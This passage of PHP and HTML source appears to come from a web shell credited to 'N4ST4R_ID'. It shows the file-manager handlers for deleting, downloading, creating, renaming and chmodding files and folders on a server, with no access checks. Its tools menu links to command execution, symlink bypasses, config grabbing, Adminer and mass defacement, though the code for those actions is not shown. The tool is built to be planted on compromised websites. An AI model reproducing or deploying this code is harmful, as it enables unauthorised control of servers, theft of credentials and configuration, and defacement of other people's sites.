                    $_SESSION["success"] = "File deleted successfully!";
                    header("Refresh:0; url=?path=" . $path);
                    exit;
                } else {
                    $_SESSION["error"] = "Failed to delete file!";
                    header("Refresh:0; url=?path=" . $path);
                    exit;
                }
            } else {
                echo "<div class='mt-4 text-red-600 font-medium'>File does not exist or is not writable.</div>";
            }
        }

        if (isset($_POST['download'])) {
            $file = base64_decode($_POST['download']);

            if (!is_file($file) || !file_exists($file)) {
                $_SESSION["error"] = "File not found!";
                header("Refresh:0; url=?path=" . $path . $toPage);
                exit;
                header('Location: ' . $_SERVER['PHP_SELF']);
                exit;
            }

            // Clean output buffer (IMPORTANT)
            if (ob_get_level()) {
                ob_end_clean();
            }

            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
            header('Content-Length: ' . filesize($file));
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Expires: 0');

            readfile($file);
            exit;
        }
        /* END FILE ACTIONS */

        /* FOLDER ACTIONS */
        if (isset($_GET["path"]) && @$_GET["action"] === "newfolder") {
            ?>
            <form method="post" action="">
                <div class='mt-4'>
                    <label for="folder_name" class="block mb-2.5 text-sm font-medium text-gray-900 font-medium dark:text-white">New Folder Name:</label>
                    <input type="text" id="folder_name" name="folder_name" class="block w-full p-2.5 text-sm text-gray-900 font-medium bg-gray-50 shadow-md rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" required>
                    <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-indigo-600 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-indigo-600 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="newfolder">
                        Create folder
                    </button>
                </div>
            </form>
            <?php
            if (isset($_POST["newfolder"])) {
                $folderName = $_POST["folder_name"];
                $folderPath = $path . "/" . $folderName;

                if (mkdir($folderPath, 0777, true)) {
                    $_SESSION["success"] = "Folder created successfully!";
                    $_SESSION["goto"] = [
                        "text" => "OPEN FOLDER",
                        "location" => "?path=" . $path . "/" . $folderName
                    ];
                    header("Refresh:0; url=?path=" . $path . $toPage);
                    exit;
                } else {
                    $_SESSION["error"] = "Failed to create folder!";
                    header("Refresh:0; url=?path=" . $path . $toPage);
                    exit;
                }
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "renamefolder" && isset($_GET["folder"])) {
            $folderPath = $path . "/" . $_GET["folder"];
            if (file_exists($folderPath) && is_dir($folderPath) && is_writable($folderPath)) {
            ?>
                <form method="post" action="">
                    <div class='mt-4'>
                        <h2 class='text-lg font-semibold'>Rename Folder: <code><?= htmlspecialchars($_GET["folder"]); ?></code></h2>
                        <input type="text" name="new_name" class="block w-full p-2.5 text-sm text-gray-900 font-medium bg-gray-50 shadow-md rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" value="<?= htmlspecialchars($_GET["folder"]); ?>" required>
                        <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-indigo-600 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-indigo-600 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="renamefolder">
                            Rename Folder
                        </button>
                    </div>
                </form>
                <?php
                if (isset($_POST["renamefolder"])) {
                    $newName = $_POST["new_name"];
                    $newPath = $path . "/" . $newName;

                    if (rename($folderPath, $newPath)) {
                        $_SESSION["success"] = "Folder renamed successfully!";
                        header("Refresh:0; url=?path=" . $path . "&folder=" . $newName . "&action=renamefolder") . $toPage;
                        exit;
                    } else {
                        $_SESSION["error"] = "Failed to rename folder!";
                        header("Refresh:0; url=?path=" . $path . $toPage);
                        exit;
                    }
                }
            } else {
                ?>
                <div class='mt-4 text-red-600 font-medium'>Folder does not exist or is not writable.</div>
            <?php
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "chmodfolder" && isset($_GET["folder"])) {
            $folderPath = $path . "/" . $_GET["folder"];
            if (file_exists($folderPath) && is_dir($folderPath)) {
            ?>
                <form method="post" action="">
                    <div class='mt-4'>
                        <h2 class='text-lg font-semibold'>Chmod Folder: <code><?= htmlspecialchars($_GET["folder"]); ?></code></h2>
                        <input type="text" name="new_perms" class="block w-full p-2.5 text-sm text-gray-900 font-medium bg-gray-50 shadow-md rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" value="<?= substr(sprintf('%o', @fileperms($folderPath)), -4); ?>" required>
                        <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-indigo-600 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-indigo-600 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="chmodfolder">
                            Change Permission
                        </button>
                    </div>
                </form>
                <?php
                if (isset($_POST["chmodfolder"])) {
                    $newPerms = intval($_POST["new_perms"], 8);

                    if (chmod($folderPath, $newPerms)) {
                        $_SESSION["success"] = "Successfully changed permission!";
                        header("Refresh:0; url=?path=" . $path . "&folder=" . $_GET["folder"] . "&action=chmodfolder" . $toPage);
                        exit;
                    } else {
                        $_SESSION["error"] = "Failed to change permission!";
                        header("Refresh:0; url=?path=" . $path . $toPage);
                        exit;
                    }
                }
            } else {
                ?>
                <div class='mt-4 text-red-600 font-medium'>Folder does not exist or is not writable.</div>
        <?php
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "deletefolder" && isset($_GET["folder"])) {
            $folderPath = $path . "/" . $_GET["folder"];
            if (file_exists($folderPath) && is_dir($folderPath) && is_writable($folderPath)) {
                if (deleteFolder($folderPath)) {
                    $_SESSION["success"] = "Folder deleted successfully!";
                    header("Refresh:0; url=?path=" . $path . $toPage);
                    exit;
                } else {
                    $_SESSION["error"] = "Failed to delete folder!";
                    header("Refresh:0; url=?path=" . $path . $toPage);
                    exit;
                }
            } else {
                echo "<div class='mt-4 text-red-600 font-medium'>Folder does not exist or is not writable.</div>";
            }
        }
        /* END FOLDER ACTIONS */
        ?>

        <?php if (!isset($_GET["action"])): ?>
            <div class="flex mt-5">
                <a class="flex gap-x-1 item-center text-gray-700 uppercase bg-gray-50 shadow-md dark:bg-gray-700 dark:text-gray-400 p-3 rounded-tl-lg br-8 hover:scale-110 transition-transform duration-300 ease-in-out" href="?path=<?= $path; ?>&action=newfile">
                    <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                        <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h14m-7 7V5" />
                    </svg>
                    <span>FILE</span>
                </a>
                <a class="flex gap-x-1 item-center text-gray-700 uppercase bg-gray-50 shadow-md dark:bg-gray-700 dark:text-gray-400 p-3 hover:scale-110 transition-transform duration-300 ease-in-out" href="?path=<?= $path; ?>&action=newfolder">
                    <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                        <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h14m-7 7V5" />
                    </svg>
                    <span>DIR</span>
                </a>
                <button type="button" id="showTools" class="flex gap-x-1 item-center text-gray-700 uppercase bg-gray-50 shadow-md dark:bg-gray-700 dark:text-gray-400 p-3 rounded-tr-lg bl-8 hover:scale-110 transition-transform duration-300 ease-in-out" href="?path=<?= $path; ?>&action=newfolder">
                    <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                        <path stroke="currentColor" stroke-linejoin="round" stroke-width="2" d="M7.58209 8.96025 9.8136 11.1917l-1.61782 1.6178c-1.08305-.1811-2.23623.1454-3.07364.9828-1.1208 1.1208-1.32697 2.8069-.62368 4.1363.14842.2806.42122.474.73509.5213.06726.0101.1347.0133.20136.0098-.00351.0666-.00036.1341.00977.2013.04724.3139.24069.5867.52125.7351 1.32944.7033 3.01552.4971 4.13627-.6237.8375-.8374 1.1639-1.9906.9829-3.0736l4.8107-4.8108c1.0831.1811 2.2363-.1454 3.0737-.9828 1.1208-1.1208 1.3269-2.80688.6237-4.13632-.1485-.28056-.4213-.474-.7351-.52125-.0673-.01012-.1347-.01327-.2014-.00977.0035-.06666.0004-.13409-.0098-.20136-.0472-.31386-.2406-.58666-.5212-.73508-1.3294-.70329-3.0155-.49713-4.1363.62367-.8374.83741-1.1639 1.9906-.9828 3.07365l-1.7788 1.77875-2.23152-2.23148-1.41419 1.41424Zm1.31056-3.1394c-.04235-.32684-.24303-.61183-.53647-.76186l-1.98183-1.0133c-.38619-.19746-.85564-.12345-1.16234.18326l-.86321.8632c-.3067.3067-.38072.77616-.18326 1.16235l1.0133 1.98182c.15004.29345.43503.49412.76187.53647l1.1127.14418c.3076.03985.61628-.06528.8356-.28461l.86321-.8632c.21932-.21932.32446-.52801.2846-.83561l-.14417-1.1127ZM19.4448 16.4052l-3.1186-3.1187c-.7811-.781-2.0474-.781-2.8285 0l-.1719.172c-.7811.781-.7811 2.0474 0 2.8284l3.1186 3.1187c.7811.781 2.0474.781 2.8285 0l.1719-.172c.7811-.781.7811-2.0474 0-2.8284Z" />
                    </svg>
                    <span>TOOLS</span>
                </button>
            </div>

            <!-- TOOLS DISPLAY -->
            <div id="toolsDisplay" class="hidden rounded-tr-lg bl-8 text-gray-700 bg-gray-50 dark:bg-gray-700 dark:text-gray-400 px-3 py-5">
                <!-- Row 1 -->
                <div class="flex justify-center flex-wrap gap-y-2 gap-x-1 w-full max-w-xl mx-auto">
                    <a href="?path=<?= $path; ?>&action=command<?= $toPage ?>" class="text-white bg-gradient-to-r from-blue-500 via-blue-600 to-blue-700 hover:bg-gradient-to-br focus:ring-4 focus:outline-none focus:ring-blue-300 dark:focus:ring-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center me-2 mb-2">
                        COMMAND
                    </a>
                    <a href="?path=<?= $path; ?>&action=b64decode<?= $toPage ?>" class="text-white bg-gradient-to-r from-green-400 via-green-500 to-green-600 hover:bg-gradient-to-br focus:ring-4 focus:outline-none focus:ring-green-300 dark:focus:ring-green-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center me-2 mb-2">
                        BASE64 DECODE
                    </a>
                    <a href="?path=<?= $path; ?>&action=b64encode<?= $toPage ?>" class="text-white bg-gradient-to-r from-cyan-400 via-cyan-500 to-cyan-600 hover:bg-gradient-to-br focus:ring-4 focus:outline-none focus:ring-cyan-300 dark:focus:ring-cyan-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center me-2 mb-2">
                        BASE64 ENCODE
                    </a>
                    <a href="?path=<?= $path; ?>&action=symvhosts<?= $toPage ?>" class="text-white bg-gradient-to-r from-teal-400 via-teal-500 to-teal-600 hover:bg-gradient-to-br focus:ring-4 focus:outline-none focus:ring-teal-300 dark:focus:ring-teal-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center me-2 mb-2">
                        SYMLINK VHOSTS
                    </a>
                    <a href="?path=<?= $path; ?>&action=sym403<?= $toPage ?>" class="text-white bg-gradient-to-r from-purple-500 via-purple-600 to-purple-700 hover:bg-gradient-to-br focus:ring-4 focus:outline-none focus:ring-purple-300 dark:focus:ring-purple-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center me-2 mb-2">
                        SYMLINK 403
                    </a>
                    <a href="?path=<?= $path; ?>&action=grabconfig<?= $toPage ?>" class="text-white bg-gradient-to-r from-red-400 via-red-500 to-red-600 hover:bg-gradient-to-br focus:ring-4 focus:outline-none focus:ring-red-300 dark:focus:ring-red-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center me-2 mb-2">
                        GRAB CONFIG
                    </a>
                    <a href="?path=<?= $path; ?>&action=adminer<?= $toPage ?>" class="text-white bg-gradient-to-r from-cyan-400 via-cyan-500 to-cyan-600 hover:bg-gradient-to-br focus:ring-4 focus:outline-none focus:ring-cyan-300 dark:focus:ring-cyan-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center me-2 mb-2">
                        ADMINER
                    </a>
                    <a href="?path=<?= $path; ?>&action=massdeface<?= $toPage ?>" class="text-white bg-gradient-to-r from-pink-400 via-pink-500 to-pink-600 hover:bg-gradient-to-br focus:ring-4 focus:outline-none focus:ring-pink-300 dark:focus:ring-pink-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center me-2 mb-2">
                        MASS DEFACE
                    </a>
                </div>
            </div>
            <!-- END TOOLS DISPLAY -->

            <!-- TABLE DISPLAY -->
            <div class="relative overflow-x-auto shadow-lg rounded-br-lg rounded-bl-lg rounded-tr-lg">
                <?php if (@is_readable($path)): ?>
                    <table class="w-full text-sm text-left rtl:text-right text-gray-500 dark:text-gray-400">
                        <thead class="text-xs text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400">
                            <tr>
                                <th class="px-6 py-3">Name</th>
                                <th class="px-6 py-3">Size</th>
                                <th class="px-6 py-3">Owner/Group</th>
                                <th class="px-6 py-3">Last Modified</th>
                                <th class="px-6 py-3">Permission</th>
                                <th class="px-6 py-3">Action</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php
                            $itemsPerPage = 70;

                            // Get all items
                            $allItems = scandir($path);
                            $allItems = array_diff($allItems, ['.', '..']);

                            // Apply search filter
                            if ($search !== '') {
                                $allItems = array_filter($allItems, function ($item) use ($search) {
                                    return strpos(strtolower($item), $search) !== false;
                                });
                            }

                            $allItems = array_values($allItems); // reindex

                            // Separate folders and files
                            $folders = [];
                            $files = [];
                            foreach ($allItems as $item) {
                                if (is_dir($path . DIRECTORY_SEPARATOR . $item)) {
                                    $folders[] = $item;
                                } else {
                                    $files[] = $item;
                                }
                            }

                            // Merge with folders first
                            $sortedItems = array_merge($folders, $files);

                            // Pagination
                            $totalItems = count($sortedItems);
                            $totalPages = @ceil($totalItems / $itemsPerPage);
                            $page = isset($_GET['page']) ? max(1, intval($_GET['page'])) : 1;
                            $offset = ($page - 1) * $itemsPerPage;
                            $pagedItems = array_slice($sortedItems, $offset, $itemsPerPage);

                            if (empty($pagedItems)) {
                                echo "<tr><td colspan='6' class='px-6 py-4 text-center text-gray-500 dark:text-gray-400'>No matching files or folders found.</td></tr>";
                            }

                            // Folders
                            foreach ($pagedItems as $folder) {
                                if (is_file($path . DIRECTORY_SEPARATOR . $folder)) continue;
                                $folderPath = $path . "/" . $folder;
                                $folderPerms = substr(sprintf('%o', @fileperms($folderPath)), -4);
                            ?>
                                <tr class='bg-white border-b dark:bg-gray-800 dark:border-gray-700 hover:bg-gray-50 shadow-md dark:hover:bg-gray-600'>
                                    <td class='px-6 py-4 font-medium text-gray-900 whitespace-nowrap dark:text-white'>
                                        <a class="flex items-center gap-x-1" href="?path=<?= $path . DIRECTORY_SEPARATOR . $folder; ?>&search=<?= $search ?>">
                                            <svg class="w-6 h-6 text-yellow-500 dark:text-yellow-400" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24">
                                                <path fill-rule="evenodd" d="M3 6a2 2 0 0 1 2-2h5.532a2 2 0 0 1 1.536.72l1.9 2.28H3V6Zm0 3v10a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V9H3Z" clip-rule="evenodd" />
                                            </svg>
                                            <span><?= htmlspecialchars($folder); ?></span>
                                        </a>
                                    </td>
                                    <td class='px-6 py-4 font-medium'>---</td>
                                    <td class='px-6 py-4 font-medium whitespace-nowrap'><?= gor($folderPath); ?>/<?= ggr($folderPath); ?></td>
                                    <td id='chdate' data-item-path='<?= $folder ?>' class='px-6 py-4 font-medium whitespace-nowrap'><?= filedate($folderPath); ?></td>
                                    <td class='px-6 py-4 font-medium <?= is_writable($folderPath) ? "text-green-500 dark:text-green-400" : "text-red-500 dark:text-red-400"; ?>'><?= $folderPerms; ?></td>
                                    <td class='px-6 py-4 flex gap-x-1'>
                                        <a href="?path=<?= $path ?>&folder=<?= $folder ?>&action=renamefolder&search=<?= $search . $toPage ?>">
                                            <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                                                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.779 17.779 4.36 19.918 6.5 13.5m4.279 4.279 8.364-8.643a3.027 3.027 0 0 0-2.14-5.165 3.03 3.03 0 0 0-2.14.886L6.5 13.5m4.279 4.279L6.499 13.5m2.14 2.14 6.213-6.504M12.75 7.04 17 11.28" />
                                            </svg>
                                        </a>
                                        <a href="?path=<?= $path ?>&folder=<?= $folder ?>&action=chmodfolder&search=<?= $search . $toPage ?>">
                                            <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                                                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 8v8m0-8h8M8 8H6a2 2 0 1 1 2-2v2Zm0 8h8m-8 0H6a2 2 0 1 0 2 2v-2Zm8 0V8m0 8h2a2 2 0 1 1-2 2v-2Zm0-8h2a2 2 0 1 0-2-2v2Z" />
                                            </svg>
                                        </a>
                                        <a href="?path=<?= $path ?>&folder=<?= $folder ?>&action=deletefolder&search=<?= $search . $toPage ?>">
                                            <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
                                                <path fill-rule="evenodd" d="M8.586 2.586A2 2 0 0 1 10 2h4a2 2 0 0 1 2 2v2h3a1 1 0 1 1 0 2v12a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V8a1 1 0 0 1 0-2h3V4a2 2 0 0 1 .586-1.414ZM10 6h4V4h-4v2Zm1 4a1 1 0 1 0-2 0v8a1 1 0 1 0 2 0v-8Zm4 0a1 1 0 1 0-2 0v8a1 1 0 1 0 2 0v-8Z" clip-rule="evenodd" />
                                            </svg>
                                        </a>
                                    </td>
                                </tr>
                            <?php
                            }

                            // Files
                            foreach ($pagedItems as $file) {
                                if (is_dir($path . DIRECTORY_SEPARATOR . $file)) continue;
                                $filePath = $path . "/" . $file;
                                $fileSize = @filesize($filePath);
                                $filePerms = substr(sprintf('%o', @fileperms($filePath)), -4);
                            ?>
                                <tr class='bg-white border-b dark:bg-gray-800 dark:border-gray-700 hover:bg-gray-50 shadow-md dark:hover:bg-gray-600'>
                                    <td class='px-6 py-4 font-medium text-gray-900 whitespace-nowrap dark:text-white'>
                                        <a class="flex items-center gap-x-1" href="?path=<?= $path ?>&file=<?= $file ?>&action=view&search=<?= $search . $toPage ?>">
                                            <svg class="w-6 h-6 text-blue-400 dark:text-blue-300" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24">
                                                <path fill-rule="evenodd" d="M9 2.221V7H4.221a2 2 0 0 1 .365-.5L8.5 2.586A2 2 0 0 1 9 2.22ZM11 2v5a2 2 0 0 1-2 2H4v11a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V4a2 2 0 0 0-2-2h-7Z" clip-rule="evenodd" />
                                            </svg>
                                            <span><?= htmlspecialchars($file); ?></span>
                                        </a>
                                    </td>
                                    <td class='px-6 py-4 font-medium whitespace-nowrap'><?= $fileSize ?> bytes</td>
                                    <td class='px-6 py-4 font-medium whitespace-nowrap'><?= gor($filePath); ?>/<?= ggr($filePath); ?></td>
                                    <td id='chdate' data-item-path='<?= $file ?>' class='px-6 py-4 font-medium whitespace-nowrap'><?= filedate($filePath); ?></td>
                                    <td class='px-6 py-4 font-medium <?= is_writable($filePath) ? "text-green-500 dark:text-green-400" : "text-red-500 dark:text-red-400"; ?>'><?= $filePerms; ?></td>
                                    <td class='px-6 py-4 flex gap-x-1'>
                                        <a href="?path=<?= $path ?>&file=<?= $file ?>&action=edit&search=<?= $search . $toPage ?>">
                                            <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
                                                <path fill-rule="evenodd" d="M11.32 6.176H5c-1.105 0-2 .949-2 2.118v10.588C3 20.052 3.895 21 5 21h11c1.105 0 2-.948 2-2.118v-7.75l-3.914 4.144A2.46 2.46 0 0 1 12.81 16l-2.681.568c-1.75.37-3.292-1.263-2.942-3.115l.536-2.839c.097-.512.335-.983.684-1.352l2.914-3.086Z" clip-rule="evenodd" />
                                                <path fill-rule="evenodd" d="M19.846 4.318a2.148 2.148 0 0 0-.437-.692 2.014 2.014 0 0 0-.654-.463 1.92 1.92 0 0 0-1.544 0 2.014 2.014 0 0 0-.654.463l-.546.578 2.852 3.02.546-.579a2.14 2.14 0 0 0 .437-.692 2.244 2.244 0 0 0 0-1.635ZM17.45 8.721 14.597 5.7 9.82 10.76a.54.54 0 0 0-.137.27l-.536 2.84c-.07.37.239.696.588.622l2.682-.567a.492.492 0 0 0 .255-.145l4.778-5.06Z" clip-rule="evenodd" />
                                            </svg>
                                        </a>
                                        <button onclick="postDownload('<?= addslashes($filePath) ?>')">
                                            <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                                                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 15v2a3 3 0 0 0 3 3h10a3 3 0 0 0 3-3v-2m-8 1V4m0 12-4-4m4 4 4-4" />
                                            </svg>
                                        </button>
                                        <a href="?path=<?= $path ?>&file=<?= $file ?>&action=chmodfile&search=<?= $search . $toPage ?>">
                                            <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                                                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 8v8m0-8h8M8 8H6a2 2 0 1 1 2-2v2Zm0 8h8m-8 0H6a2 2 0 1 0 2 2v-2Zm8 0V8m0 8h2a2 2 0 1 1-2 2v-2Zm0-8h2a2 2 0 1 0-2-2v2Z" />
                                            </svg>
                                        </a>
                                        <a href="?path=<?= $path ?>&file=<?= $file ?>&action=deletefile&search=<?= $search . $toPage ?>">
                                            <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
                                                <path fill-rule="evenodd" d="M8.586 2.586A2 2 0 0 1 10 2h4a2 2 0 0 1 2 2v2h3a1 1 0 1 1 0 2v12a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V8a1 1 0 0 1 0-2h3V4a2 2 0 0 1 .586-1.414ZM10 6h4V4h-4v2Zm1 4a1 1 0 1 0-2 0v8a1 1 0 1 0 2 0v-8Zm4 0a1 1 0 1 0-2 0v8a1 1 0 1 0 2 0v-8Z" clip-rule="evenodd" />
                                            </svg>
                                        </a>
                                    </td>
                                </tr>
                            <?php
                            }
                            ?>
                        </tbody>
                    </table>
                <?php else: ?>
                    <div class="flex items-center justify-center w-full h-[150px] bg-gray-50 shadow-md dark:bg-gray-700">
                        <span class="text-center text-md text-gray-700 uppercase dark:text-gray-400">Directory Is NOT Readable</span>
                    </div>
                <?php endif; ?>
            </div>
            <!-- END TABLE DISPLAY -->

            <!-- PAGINATION -->
            <?php if (@is_readable($path)): ?>
                <div class="flex justify-center mt-4">
                    <?php if ($totalPages > 1): ?>
                        <nav aria-label="Page navigation">
                            <ul class="inline-flex space-x-1 text-sm">

                                <!-- Previous Button -->
                                <li>
                                    <?php if ($page > 1): ?>
                                        <a href="?path=<?= $path ?>&search=<?= $search ?>&page=<?= $page - 1 ?>"
                                            class="flex items-center justify-center w-8 h-8 text-gray-500 bg-white border border-gray-300 rounded-lg 
                               hover:bg-gray-100 hover:text-gray-700 
                               dark:bg-gray-800 dark:border-gray-700 dark:text-gray-400 dark:hover:bg-gray-700 dark:hover:text-white">
                                            â€¹
                                        </a>
                                    <?php else: ?>
                                        <span class="flex items-center justify-center w-8 h-8 text-gray-400 bg-gray-200 border border-gray-300 rounded-lg 
                             dark:bg-gray-700 dark:border-gray-700 dark:text-gray-500">
                                            â€¹
                                        </span>
                                    <?php endif; ?>
                                </li>

                                <!-- Page Numbers -->
                                <?php
                                $range = 1;
                                $ellipsisShownLeft = false;
                                $ellipsisShownRight = false;

                                for ($i = 1; $i <= $totalPages; $i++) {
                                    if ($i == 1 || $i == $totalPages || ($i >= $page - $range && $i <= $page + $range)) {
                                        if ($i == $page) {
                                            echo '<li>
                                <span class="flex items-center justify-center w-8 h-8 text-blue-600 border border-gray-300 bg-blue-50 
                                             dark:border-gray-700 dark:bg-gray-700 dark:text-white">'
                                                . $i .
                                                '</span>
                            </li>';
                                        } else {
                                            echo '<li>
                                <a href="?path=' . $path . '&search=' . $search . '&page=' . $i . '" 
                                   class="flex items-center justify-center w-8 h-8 text-gray-500 bg-white border border-gray-300 rounded-lg 
                                          hover:bg-gray-100 hover:text-gray-700 
                                          dark:bg-gray-800 dark:border-gray-700 dark:text-gray-400 dark:hover:bg-gray-700 dark:hover:text-white">'
                                                . $i .
                                                '</a>
                            </li>';
                                        }
                                    } else {
                                        if ($i < $page - $range && !$ellipsisShownLeft) {
                                            echo '<li><span class="flex items-center justify-center w-8 h-8">...</span></li>';
                                            $ellipsisShownLeft = true;
                                        }
                                        if ($i > $page + $range && !$ellipsisShownRight) {
                                            echo '<li><span class="flex items-center justify-center w-8 h-8">...</span></li>';
                                            $ellipsisShownRight = true;
                                        }
                                    }
                                }
                                ?>

                                <!-- Next Button -->
                                <li>
                                    <?php if ($page < $totalPages): ?>
                                        <a href="?path=<?= $path ?>&search=<?= $search ?>&page=<?= $page + 1 ?>"
                                            class="flex items-center justify-center w-8 h-8 text-gray-500 bg-white border border-gray-300 rounded-lg 
                               hover:bg-gray-100 hover:text-gray-700 
                               dark:bg-gray-800 dark:border-gray-700 dark:text-gray-400 dark:hover:bg-gray-700 dark:hover:text-white">
                                            â€º
                                        </a>
                                    <?php else: ?>
                                        <span class="flex items-center justify-center w-8 h-8 text-gray-400 bg-gray-200 border border-gray-300 rounded-lg 
                             dark:bg-gray-700 dark:border-gray-700 dark:text-gray-500">
                                            â€º
                                        </span>
                                    <?php endif; ?>
                                </li>

                            </ul>
                        </nav>
                    <?php endif; ?>
                </div>
            <?php endif; ?>
            <!-- END PAGINATION -->
        <?php endif; ?>

        <footer>
            <div class="mt-6 text-center text-gray-500 text-sm mb-2">
                <p>Created by <span class="text-blue-600">N4ST4R_ID | Naxtarrr</span></p><br>
                <a href="https://github.com/nastar-id" class="text-white bg-[#24292F] hover:bg-[#24292F]/90 focus:ring-4 focus:outline-none focus:ring-[#24292F]/50 font-medium rounded-lg text-sm px-5 py-2.5 text-center inline-flex items-center dark:focus:ring-gray-500 dark:hover:bg-[#050708]/30 me-2 mb-2">
                    <svg class="w-4 h-4 me-2" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 20 20">
                        <path fill-rule="evenodd" d="M10 .333A9.911 9.911 0 0 0 6.866 19.65c.5.092.678-.215.678-.477 0-.237-.01-1.017-.014-1.845-2.757.6-3.338-1.169-3.338-1.169a2.627 2.627 0 0 0-1.1-1.451c-.9-.615.07-.6.07-.6a2.084 2.084 0 0 1 1.518 1.021 2.11 2.11 0 0 0 2.884.823c.044-.503.268-.973.63-1.325-2.2-.25-4.516-1.1-4.516-4.9A3.832 3.832 0 0 1 4.7 7.068a3.56 3.56 0 0 1 .095-2.623s.832-.266 2.726 1.016a9.409 9.409 0 0 1 4.962 0c1.89-1.282 2.717-1.016 2.717-1.016.366.83.402 1.768.1 2.623a3.827 3.827 0 0 1 1.02 2.659c0 3.807-2.319 4.644-4.525 4.889a2.366 2.366 0 0 1 .673 1.834c0 1.326-.012 2.394-.012 2.72 0 .263.18.572.681.475A9.911 9.911 0 0 0 10 .333Z" clip-rule="evenodd" />
                    </svg>
                    Follow on Github
                </a>
        </footer>
    </div>

    <script>
        const themeToggleDarkIcon = document.getElementById('theme-toggle-dark-icon');
        const themeToggleLightIcon = document.getElementById('theme-toggle-light-icon');
        const lightText = document.querySelector('#light-text');
        const darkText = document.querySelector('#dark-text');
        const themeToggleBtn = document.getElementById('theme-toggle');

        if (
            localStorage.getItem('color-theme') === 'dark' ||
            (!('color-theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)
        ) {
            document.documentElement.classList.add('dark');
            themeToggleLightIcon.classList.remove('hidden');
            themeToggleDarkIcon.classList.add('hidden');
            lightText.classList.remove('hidden');
            darkText.classList.add('hidden');
        } else {
            document.documentElement.classList.remove('dark');
            themeToggleDarkIcon.classList.remove('hidden');
            themeToggleLightIcon.classList.add('hidden');
            lightText.classList.add('hidden');
            darkText.classList.remove('hidden');
        }

        themeToggleBtn.addEventListener('click', function() {
            if (document.documentElement.classList.contains('dark')) {
                document.documentElement.classList.remove('dark');
